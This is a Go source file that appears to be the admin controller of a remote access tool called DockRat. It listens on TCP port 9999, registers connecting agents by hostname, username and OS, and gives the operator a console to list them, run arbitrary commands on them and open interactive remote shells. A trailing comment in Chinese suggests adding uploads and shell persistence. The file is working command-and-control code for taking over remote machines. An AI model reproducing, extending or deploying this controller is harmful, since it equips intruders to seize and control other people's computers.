
package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"strings"

	"github.com/Singert/DockRat/core/node"
	"github.com/Singert/DockRat/core/protocol"
)

type HandshakePayload struct {
	Hostname string `json:"hostname"`
	Username string `json:"username"`
	OS       string `json:"os"`
}

var registry = node.NewRegistry()

func main() {
	log.Println("[+] Admin starting...")
	go startConsole()

	ln, err := net.Listen("tcp", ":9999")
	if err != nil {
		log.Fatalf("Failed to listen: %v", err)
	}
	log.Println("[+] Listening on :9999")

	for {
		conn, err := ln.Accept()
		if err != nil {
			log.Println("[!] Accept error:", err)
			continue
		}
		go handleConnection(conn)
	}
}

func handleConnection(conn net.Conn) {
	log.Printf("[+] New connection from %s", conn.RemoteAddr())

	lengthBuf := make([]byte, 4)
	if _, err := io.ReadFull(conn, lengthBuf); err != nil {
		log.Println("[!] Failed to read message length:", err)
		conn.Close()
		return
	}
	length := bytesToUint32(lengthBuf)
	data := make([]byte, length)
	if _, err := io.ReadFull(conn, data); err != nil {
		log.Println("[!] Failed to read message body:", err)
		conn.Close()
		return
	}

	msg, err := protocol.DecodeMessage(data)
	if err != nil {
		log.Println("[!] Failed to decode message:", err)
		conn.Close()
		return
	}

	if msg.Type == protocol.MsgHandshake {
		var payload HandshakePayload
		if err := json.Unmarshal(msg.Payload, &payload); err != nil {
			log.Println("[!] Failed to decode handshake payload:", err)
			conn.Close()
			return
		}

		n := &node.Node{
			Conn:     conn,
			Hostname: payload.Hostname,
			Username: payload.Username,
			OS:       payload.OS,
			Addr:     conn.RemoteAddr().String(),
		}
		id := registry.Add(n)
		log.Printf("[+] Registered agent ID %d - %s@%s (%s)", id, n.Username, n.Hostname, n.OS)

		go handleAgentMessages(n)
	} else {
		log.Println("[!] Unknown message type:", msg.Type)
		conn.Close()
	}
}

func handleAgentMessages(n *node.Node) {
	conn := n.Conn
	for {
		lengthBuf := make([]byte, 4)
		if _, err := io.ReadFull(conn, lengthBuf); err != nil {
			log.Printf("[-] Node %d disconnected: %v", n.ID, err)
			registry.Remove(n.ID)
			conn.Close()
			return
		}
		length := bytesToUint32(lengthBuf)
		data := make([]byte, length)
		if _, err := io.ReadFull(conn, data); err != nil {
			log.Printf("[-] Node %d read failed: %v", n.ID, err)
			registry.Remove(n.ID)
			conn.Close()
			return
		}

		msg, err := protocol.DecodeMessage(data)
		if err != nil {
			log.Printf("[-] Node %d decode failed: %v", n.ID, err)
			continue
		}

		switch msg.Type {
		case protocol.MsgResponse:
			log.Printf("[#] Node %d response:\n%s", n.ID, string(msg.Payload))
		case protocol.MsgShell:
			fmt.Print(string(msg.Payload))
		default:
			log.Printf("[-] Node %d sent unknown message type: %s", n.ID, msg.Type)
		}
	}
}

func startConsole() {
	scanner := bufio.NewScanner(os.Stdin)
	for {
		fmt.Print("(admin) >> ")
		if !scanner.Scan() {
			break
		}
		input := strings.TrimSpace(scanner.Text())
		if input == "" {
			continue
		}

		tokens := strings.SplitN(input, " ", 2)
		cmd := tokens[0]
		arg := ""
		if len(tokens) > 1 {
			arg = tokens[1]
		}

		switch cmd {
		case "detail":
			nodes := registry.List()
			fmt.Println("[+] Connected nodes:")
			for _, n := range nodes {
				fmt.Printf("  Node[%d] -> IP: %s, Hostname: %s, User: %s, OS: %s\n",
					n.ID, n.Addr, n.Hostname, n.Username, n.OS)
			}
		case "exec":
			parts := strings.SplitN(arg, " ", 2)
			if len(parts) != 2 {
				fmt.Println("[-] Usage: exec <node_id> <command>")
				continue
			}
			id := parts[0]
			cmdStr := parts[1]
			var nid int
			fmt.Sscanf(id, "%d", &nid)
			n, ok := registry.Get(nid)
			if !ok {
				fmt.Println("[-] No such node")
				continue
			}
			cmdPayload := map[string]string{"cmd": cmdStr}
			data, _ := json.Marshal(cmdPayload)
			msg := protocol.Message{
				Type:    protocol.MsgCommand,
				Payload: data,
			}
			buf, err := protocol.EncodeMessage(msg)
			if err != nil {
				fmt.Println("[-] Encode failed:", err)
				continue
			}
			_, err = n.Conn.Write(buf)
			if err != nil {
				fmt.Println("[-] Send failed:", err)
				continue
			}
		case "shell":
			var nid int
			fmt.Sscanf(arg, "%d", &nid)
			n, ok := registry.Get(nid)
			if !ok {
				fmt.Println("[-] No such node")
				continue
			}
			msg := protocol.Message{
				Type:    protocol.MsgShell,
				Payload: []byte("start shell"),
			}
			buf, err := protocol.EncodeMessage(msg)
			if err != nil {
				fmt.Println("[-] Encode failed:", err)
				continue
			}
			_, err = n.Conn.Write(buf)
			if err != nil {
				fmt.Println("[-] Send failed:", err)
				continue
			}
			fmt.Println("[+] Shell started. Type commands (type 'exit' to quit):")
			inputScanner := bufio.NewScanner(os.Stdin)
			for {
				fmt.Print("remote$ ")
				if !inputScanner.Scan() {
					break
				}
				line := inputScanner.Text()
				if strings.TrimSpace(line) == "exit" {
					fmt.Println("[*] Exiting shell mode.")
					break
				}
				cmdMsg := protocol.Message{
					Type:    protocol.MsgShell,
					Payload: []byte(line + "\n"),
				}
				buf, err := protocol.EncodeMessage(cmdMsg)
				if err != nil {
					fmt.Println("[-] Shell encode error:", err)
					break
				}
				_, err = n.Conn.Write(buf)
				if err != nil {
					fmt.Println("[-] Shell write error:", err)
					break
				}
			}
		default:
			fmt.Println("[-] Unknown command")
		}
	}
}

func bytesToUint32(b []byte) uint32 {
	return uint32(b[0])<<24 | uint32(b[1])<<16 | uint32(b[2])<<8 | uint32(b[3])
}

/*
响应消息（如 MsgResponse）缓存起来，以便在控制台中输出最近一条响应？
你也可以将 MsgShell 输出定向到带颜色或带提示的终端 UI，后续支持退出、上传等命令扩展。
如需进一步支持 shell 会话保持、窗口调整、或 stdout 缓存，
*/
